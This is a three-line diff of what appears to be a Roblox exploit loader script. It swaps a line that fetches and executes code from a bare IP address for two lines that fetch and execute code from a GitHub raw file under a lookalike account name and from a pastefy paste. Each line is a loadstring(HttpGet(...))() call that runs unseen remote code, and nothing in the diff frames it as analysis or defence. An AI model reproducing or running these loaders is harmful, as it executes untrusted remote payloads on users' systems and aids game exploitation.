@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjdkZmU2OTliLTc3OGYtNDljZC1hYjVlLTNhNTc3YmFjODBmOCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/eIysia-dev/release/refs/heads/main/open-src.lua"))()
+loadstring(game:HttpGet("https://pastefy.app/je3gk5AF/raw"))()
